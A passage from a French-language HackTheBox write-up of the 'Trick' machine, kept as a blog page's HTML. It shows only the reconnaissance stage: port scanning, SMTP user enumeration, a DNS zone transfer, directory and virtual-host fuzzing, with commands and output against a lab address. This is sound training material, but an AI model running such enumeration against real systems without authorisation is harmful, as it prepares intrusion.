@@ -1,0 +1,1107 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Trick - z3rodol</title><meta name="Description" content="This is my cool site"><meta property="og:url" content="http://localhost:1313/trick/">
+  <meta property="og:site_name" content="z3rodol">
+  <meta property="og:title" content="Trick">
+  <meta property="og:description" content="Trick commence par une énumération pour trouver un hôte virtuel. Une injection SQL permet de contourner l’authentification et de lire des fichiers depuis le système. Cette lecture mène à un autre sous-domaine, qui est vulnérable à une LFI. A partir de cette LFI je récupère une clé privée SSH. Pour escalader au root, j’abuserai de fail2ban.
+Enumeration Nmap Le scan révèle 4 ports ouverts.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-11T10:28:41+00:00">
+    <meta property="article:modified_time" content="2025-12-11T10:28:41+00:00">
+    <meta property="article:tag" content="Easy">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="LFI">
+    <meta property="article:tag" content="SQL Injection">
+    <meta property="article:tag" content="Fail2ban">
+    <meta property="og:image" content="http://localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/logo.png">
+  <meta name="twitter:title" content="Trick">
+  <meta name="twitter:description" content="Trick commence par une énumération pour trouver un hôte virtuel. Une injection SQL permet de contourner l’authentification et de lire des fichiers depuis le système. Cette lecture mène à un autre sous-domaine, qui est vulnérable à une LFI. A partir de cette LFI je récupère une clé privée SSH. Pour escalader au root, j’abuserai de fail2ban.
+Enumeration Nmap Le scan révèle 4 ports ouverts.">
+<meta name="application-name" content="z3rodol">
+<meta name="apple-mobile-web-app-title" content="z3rodol">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/trick/" /><link rel="prev" href="http://localhost:1313/unholyunion/" /><link rel="next" href="http://localhost:1313/tombwatcher/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Trick",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/trick\/"
+        },"genre": "posts","keywords": "Easy, Linux, LFI, SQL Injection, Fail2ban","wordcount":  2802 ,
+        "url": "http:\/\/localhost:1313\/trick\/","datePublished": "2025-12-11T10:28:41+00:00","dateModified": "2025-12-11T10:28:41+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "z3rodol"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="z3rodol">z3rodol Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="z3rodol">z3rodol Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Trick</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://z3rodol.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>z3rodol</a></span>&nbsp;<span class="post-category">included in <a href="/categories/machines/"><i class="far fa-folder" aria-hidden="true"></i>Machines</a>&nbsp;<a href="/categories/hackthebox/"><i class="far fa-folder" aria-hidden="true"></i>Hackthebox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2025-12-11">2025-12-11</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;2802 words&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;14 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#enumeration">Enumeration</a>
+          <ul>
+            <li><a href="#nmap">Nmap</a></li>
+            <li><a href="#smtp---tcp-25">SMTP - TCP 25</a></li>
+            <li><a href="#dns---tcp-53">DNS - TCP 53</a>
+              <ul>
+                <li><a href="#reverse-dns-lookup">Reverse DNS Lookup</a></li>
+                <li><a href="#zone-transfert">Zone Transfert</a></li>
+              </ul>
+            </li>
+            <li><a href="#http---tcp-80">HTTP - TCP 80</a>
+              <ul>
+                <li><a href="#site">Site</a></li>
+                <li><a href="#dirsearch">dirsearch</a></li>
+                <li><a href="#vhost-fuzzing">vhost fuzzing</a></li>
+                <li><a href="#roottrickhtb">root.trick.htb</a></li>
+                <li><a href="#preprod-payrolltrickhtb">preprod-payroll.trick.htb</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#shell-as-michael">Shell as Michael</a>
+          <ul>
+            <li><a href="#dirsearch-1">dirsearch</a></li>
+            <li><a href="#sql-injection">SQL Injection</a></li>
+            <li><a href="#read-database">Read Database</a></li>
+            <li><a href="#read-files-with-sqlmap">Read Files with sqlmap</a></li>
+            <li><a href="#lfi">LFI</a></li>
+            <li><a href="#ssh">SSH</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell-as-root">Shell as root</a>
+          <ul>
+            <li><a href="#fail2ban">Fail2ban</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Trick/trick.png"
+        data-srcset="/images/Trick/trick.png, /images/Trick/trick.png 1.5x, /images/Trick/trick.png 2x"
+        data-sizes="auto"
+        alt="/images/Trick/trick.png"
+        title="Trick" width="581" height="307" /></p>
+<p>Trick commence par une énumération pour trouver un hôte virtuel. Une injection SQL permet de contourner l&rsquo;authentification et de lire des fichiers depuis le système. Cette lecture mène à un autre sous-domaine, qui est vulnérable à une LFI. A partir de cette LFI je récupère une clé privée SSH. Pour escalader au root, j&rsquo;abuserai de <code>fail2ban</code>.</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Le scan révèle 4 ports ouverts.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  rustscan -a 10.129.104.218 -- -A
+</span></span><span class="line"><span class="cl">--SNIP--
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON         VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 61ff293b36bd9dacfbde1f56884cae2d <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5Rh57OmAndXFukHce0Tr4BL8CWC8yACwWdu8VZcBPGuMUH8VkvzqseeC8MYxt5SPL1aJmAsZSgOUreAJNlYNBBKjMoFwyDdArWhqDThlgBf6aqwqMRo3XWIcbQOBkrisgqcPnRKlwh+vqArsj5OAZaUq8zs7Q3elE6HrDnj779JHCc5eba+DR+Cqk1u4JxfC6mGsaNMAXoaRKsAYlwf4Yjhonl6A6MkWszz7t9q5r2bImuYAC0cvgiHJdgLcr0WJh+lV8YIkPyya1vJFp1gN4Pg7I6CmMaiWSMgSem5aVlKmrLMX10MWhewnyuH2ekMFXUKJ8wv4DgifiAIvd6AGR
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 9ecdf2406196ea21a6ce2602af759a78 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAoXvyMKuWhQvWx52EFXK9ytX/pGmjZptG8Kb+DOgKcGeBgGPKX3ZpryuGR44av0WnKP0gnRLWk7UCbqY3mxXU0<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 7293f91158de34ad12b54b4a7364b970 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGY1WZWn9xuvXhfxFFm82J9eRGNYJ9NnfzECUm0faUXm
+</span></span><span class="line"><span class="cl">25/tcp open  smtp?   syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_smtp-commands: Couldn<span class="err">&#39;</span>t establish connection on port <span class="m">25</span>
+</span></span><span class="line"><span class="cl">53/tcp open  domain  syn-ack ttl <span class="m">63</span> ISC BIND 9.11.5-P4-5.1+deb10u7 <span class="o">(</span>Debian Linux<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> dns-nsid:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
+</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl <span class="m">63</span> nginx 1.14.2
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Coming Soon - Start Bootstrap Theme
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD</span></span></code></pre></div></div>
+<h3 id="smtp---tcp-25">SMTP - TCP 25</h3>
+<p>Avec <code>smtp-user-enum</code>, je trouve quelques utilisateurs SMTP. Le filtre <code>grep 252</code> est présent car c&rsquo;est le code SMTP confirmant l&rsquo;existence d&rsquo;un utilisateur.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  smtp-user-enum 10.129.104.218 <span class="m">25</span> -m VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt <span class="p">|</span> grep <span class="m">252</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>----<span class="o">]</span> root          <span class="m">252</span> 2.0.0 root
+</span></span><span class="line"><span class="cl"><span class="o">[</span>----<span class="o">]</span> mysql         <span class="m">252</span> 2.0.0 mysql
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  smtp-user-enum 10.129.104.218 <span class="m">25</span> -m VRFY -U /usr/share/seclists/Usernames/cirt-default-usernames.txt <span class="p">|</span> grep <span class="m">252</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>----<span class="o">]</span> BACKUP                     <span class="m">252</span> 2.0.0 BACKUP
+</span></span><span class="line"><span class="cl"><span class="o">[</span>----<span class="o">]</span> MAIL                       <span class="m">252</span> 2.0.0 MAIL
+</span></span><span class="line"><span class="cl"><span class="o">[</span>----<span class="o">]</span> NEWS                       <span class="m">252</span> 2.0.0 NEWS
+</span></span><span class="line"><span class="cl"><span class="o">[</span>----<span class="o">]</span> POSTMASTER                 <span class="m">252</span> 2.0.0 POSTMASTER
+</span></span><span class="line"><span class="cl"><span class="o">[</span>----<span class="o">]</span> ROOT                       <span class="m">252</span> 2.0.0 ROOT
+</span></span><span class="line"><span class="cl"><span class="o">[</span>----<span class="o">]</span> SYS                        <span class="m">252</span> 2.0.0 SYS
+</span></span><span class="line"><span class="cl"><span class="o">[</span>----<span class="o">]</span> bin                        <span class="m">252</span> 2.0.0 bin
+</span></span><span class="line"><span class="cl"><span class="o">[</span>----<span class="o">]</span> daemon                     <span class="m">252</span> 2.0.0 daemon
+</span></span><span class="line"><span class="cl"><span class="o">[</span>----<span class="o">]</span> games                      <span class="m">252</span> 2.0.0 games
+</span></span><span class="line"><span class="cl"><span class="o">[</span>----<span class="o">]</span> lp                         <span class="m">252</span> 2.0.0 lp
+</span></span><span class="line"><span class="cl"><span class="o">[</span>----<span class="o">]</span> mail                       <span class="m">252</span> 2.0.0 mail
+</span></span><span class="line"><span class="cl"><span class="o">[</span>----<span class="o">]</span> man                        <span class="m">252</span> 2.0.0 man
+</span></span><span class="line"><span class="cl"><span class="o">[</span>----<span class="o">]</span> news                       <span class="m">252</span> 2.0.0 news
+</span></span><span class="line"><span class="cl"><span class="o">[</span>----<span class="o">]</span> nobody                     <span class="m">252</span> 2.0.0 nobody
+</span></span><span class="line"><span class="cl"><span class="o">[</span>----<span class="o">]</span> root                       <span class="m">252</span> 2.0.0 root
+</span></span><span class="line"><span class="cl"><span class="o">[</span>----<span class="o">]</span> root                       <span class="m">252</span> 2.0.0 root
+</span></span><span class="line"><span class="cl"><span class="o">[</span>----<span class="o">]</span> root@localhost             <span class="m">252</span> 2.0.0 root@localhost
+</span></span><span class="line"><span class="cl"><span class="o">[</span>----<span class="o">]</span> sync                       <span class="m">252</span> 2.0.0 sync
+</span></span><span class="line"><span class="cl"><span class="o">[</span>----<span class="o">]</span> sys                        <span class="m">252</span> 2.0.0 sys
+</span></span><span class="line"><span class="cl"><span class="o">[</span>----<span class="o">]</span> uucp                       <span class="m">252</span> 2.0.0 uucp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  smtp-user-enum 10.129.104.218 <span class="m">25</span> -m VRFY -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt <span class="p">|</span> grep <span class="m">252</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>----<span class="o">]</span> michael                                        <span class="m">252</span> 2.0.0 michael
+</span></span><span class="line"><span class="cl"><span class="o">[</span>----<span class="o">]</span> mail                                           <span class="m">252</span> 2.0.0 mail
+</span></span><span class="line"><span class="cl"><span class="o">[</span>----<span class="o">]</span> root                                           <span class="m">252</span> 2.0.0 root</span></span></code></pre></div></div>
+<h3 id="dns---tcp-53">DNS - TCP 53</h3>
+<h4 id="reverse-dns-lookup">Reverse DNS Lookup</h4>
+<p>Je fais un requête reverse DNS et j&rsquo;ai le nom de domaine de la machine. Les options <code>+noall</code> et <code>+answer</code> sont là pour n’afficher que les résultats importants.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  dig -x 10.129.104.218 @10.129.104.218 +noall +answer
+</span></span><span class="line"><span class="cl">218.104.129.10.in-addr.arpa. <span class="m">604800</span> IN  PTR     trick.htb.</span></span></code></pre></div></div>
+<h4 id="zone-transfert">Zone Transfert</h4>
+<p>Je fais ensuite du zone transfert pour afficher les autres enregistrements disponibles.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  dig axfr trick.htb @10.129.104.218 +noall +answer
+</span></span><span class="line"><span class="cl">trick.htb.              <span class="m">604800</span>  IN      SOA     trick.htb. root.trick.htb. <span class="m">5</span> <span class="m">604800</span> <span class="m">86400</span> <span class="m">2419200</span> <span class="m">604800</span>
+</span></span><span class="line"><span class="cl">trick.htb.              <span class="m">604800</span>  IN      NS      trick.htb.
+</span></span><span class="line"><span class="cl">trick.htb.              <span class="m">604800</span>  IN      A       127.0.0.1
+</span></span><span class="line"><span class="cl">trick.htb.              <span class="m">604800</span>  IN      AAAA    ::1
+</span></span><span class="line"><span class="cl">preprod-payroll.trick.htb. <span class="m">604800</span> IN    CNAME   trick.htb.
+</span></span><span class="line"><span class="cl">trick.htb.              <span class="m">604800</span>  IN      SOA     trick.htb. root.trick.htb. <span class="m">5</span> <span class="m">604800</span> <span class="m">86400</span> <span class="m">2419200</span> <span class="m">604800</span></span></span></code></pre></div></div>
+<p>J&rsquo;ajoute tout ça au fichier <code>/etc/hosts</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10.129.104.218 trick.htb root.trick.htb preprod-payroll.trick.htb&#34;</span> <span class="p">|</span> tee -a /etc/hosts</span></span></code></pre></div></div>
+<h3 id="http---tcp-80">HTTP - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>Le site semble être en pleine création. Il s&rsquo;agit d&rsquo;un site static sans aucune fonctionnalité.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Trick/Trick-1.png"
+        data-srcset="/images/Trick/Trick-1.png, /images/Trick/Trick-1.png 1.5x, /images/Trick/Trick-1.png 2x"
+        data-sizes="auto"
+        alt="/images/Trick/Trick-1.png"
+        title="/images/Trick/Trick-1.png" width="1920" height="889" /></p>
+<h4 id="dirsearch">dirsearch</h4>
+<p>L’énumération de répertoires ne donne rien d’intéressant.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  dirsearch -u http://10.129.104.218/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  _<span class="p">|</span>. _ _  _  _  _ _<span class="p">|</span>_    v0.4.3
+</span></span><span class="line"><span class="cl"> <span class="o">(</span>_<span class="o">||</span><span class="p">|</span> _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_<span class="o">||</span> <span class="o">(</span>_<span class="p">|</span> <span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Extensions: php, asp, aspx, jsp, html, htm <span class="p">|</span> HTTP method: GET <span class="p">|</span> Threads: <span class="m">25</span> <span class="p">|</span> Wordlist size: <span class="m">12289</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Target: http://10.129.104.218/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>17:33:52<span class="o">]</span> Scanning:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>17:33:57<span class="o">]</span> <span class="m">403</span> -   571B - /assets/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>17:33:57<span class="o">]</span> <span class="m">301</span> -   185B - /assets  -&gt;  http://10.129.104.218/assets/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>17:33:59<span class="o">]</span> <span class="m">301</span> -   185B - /css  -&gt;  http://10.129.104.218/css/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>17:34:00<span class="o">]</span> <span class="m">200</span> -    5KB - /index.html
+</span></span><span class="line"><span class="cl"><span class="o">[</span>17:34:01<span class="o">]</span> <span class="m">301</span> -   185B - /js  -&gt;  http://10.129.104.218/js/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>17:34:01<span class="o">]</span> <span class="m">403</span> -   571B - /js/</span></span></code></pre></div></div>
+<h4 id="vhost-fuzzing">vhost fuzzing</h4>
+<p>Je ne trouve aucun autre sous domaine.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-htb /workspace/Trick
+</span></span><span class="line"><span class="cl">╰─➤  ffuf -u http://trick.htb -H <span class="s2">&#34;Host: FUZZ.trick.htb&#34;</span> -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs <span class="m">5480</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\
+</span></span></span><span class="line"><span class="cl">       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/
+</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\
+</span></span></span><span class="line"><span class="cl">        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/
+</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\
+</span></span></span><span class="line"><span class="cl">          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       v2.1.0-dev
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> :: Method           : GET
+</span></span><span class="line"><span class="cl"> :: URL              : http://trick.htb
+</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
+</span></span><span class="line"><span class="cl"> :: Header           : Host: FUZZ.trick.htb
+</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
+</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>
+</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span class="line"><span class="cl"> :: Filter           : Response size: <span class="m">5480</span>
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">:: Progress: <span class="o">[</span>151265/151265<span class="o">]</span> :: Job <span class="o">[</span>1/1<span class="o">]</span> :: <span class="m">1666</span> req/sec :: Duration: <span class="o">[</span>0:02:14<span class="o">]</span> :: Errors: <span class="m">40</span> ::</span></span></code></pre></div></div>
+<h4 id="roottrickhtb">root.trick.htb</h4>
+<p>Le sous-domaine <code>root.trick.htb</code> redirige vers la même page que ce qui se trouve sur le domaine principal.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Trick/Trick-2.png"
+        data-srcset="/images/Trick/Trick-2.png, /images/Trick/Trick-2.png 1.5x, /images/Trick/Trick-2.png 2x"
+        data-sizes="auto"
+        alt="/images/Trick/Trick-2.png"
+        title="/images/Trick/Trick-2.png" width="1920" height="963" /></p>
+<h4 id="preprod-payrolltrickhtb">preprod-payroll.trick.htb</h4>
+<p>Le site nous redirige vers une page de connexion.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Trick/Trick-4.png"
